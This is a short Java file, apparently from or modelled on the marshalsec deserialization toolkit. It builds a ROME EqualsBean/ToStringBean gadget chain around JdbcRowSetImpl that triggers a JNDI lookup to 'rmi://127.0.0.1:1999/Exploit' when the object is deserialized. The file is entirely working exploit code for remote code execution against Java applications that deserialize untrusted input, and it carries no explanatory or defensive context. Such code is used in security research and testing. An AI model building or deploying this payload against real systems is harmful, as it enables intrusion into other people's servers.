package marshalsec;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import marshalsec.gadgets.JDKUtil;

public class GetObject {
    public static void main(String[] arg) throws Exception {

        Object obj = getObject();

        System.out.println(obj);

    }

    public static Object getObject() throws Exception {
        String url = "rmi://127.0.0.1:1999/Exploit";
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(url));
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        return JDKUtil.makeMap(root, root);
    }
}
